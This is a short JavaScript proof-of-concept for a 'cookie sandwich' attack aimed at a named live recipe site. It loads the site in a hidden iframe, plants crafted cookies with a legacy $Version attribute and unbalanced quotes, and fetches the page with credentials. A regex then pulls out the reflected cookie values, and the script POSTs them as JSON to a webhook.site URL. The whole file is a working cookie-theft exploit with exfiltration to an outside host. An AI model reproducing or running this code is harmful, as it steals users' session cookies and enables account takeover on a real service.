async function sandwich(target, cookie) {
    // Step 1: Create an iframe with target src and wait for it
    const iframe = document.createElement('iframe');

    const url = new URL(target);
    const domain = ".allrecipes.com";
    const path = "/instant-pot-quinoa-recipe-7494907";

    iframe.src = target;
    // Hide the iframe
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    // Optional: Add your code to check and clean client's cookies if needed
    iframe.onload = async () => {
        // Step 2: Create cookie gadget
        document.cookie = `$Version=1; domain=${domain}; path=${path};`;
        document.cookie = `${cookie}="deadbeef; domain=${domain}; path=${path};`;
        document.cookie = `dummy=qaz"; domain=${domain}; path=/;`;
        // Step 3: Send a fetch request
        
            const response = await fetch(`${target}`, {
                credentials: 'include',
            });
            const regexf = /deadbeef([\s\S]*?)dummy/g;
            const responseData = await response.text();
            var result = responseData.match(regexf);
            const resultado = result.join(" ")
            // Step 4: Alert respone
            const x2 = await fetch("https://webhook.site/49c9cc9e-5da5-400e-8342-54b339a0a24a/", {
              method: "POST",
              mode: 'no-cors',
              headers: {
                "Content-Type": "application/json"
              },
      // Enviando o texto no campo 'mensagem' do body
            body: JSON.stringify({ cookies: resultado })
            });
            alert(responseData); 
    }
}

setTimeout(sandwich, 100, 'https://www.allrecipes.com/instant-pot-quinoa-recipe-7494907', 'hid');
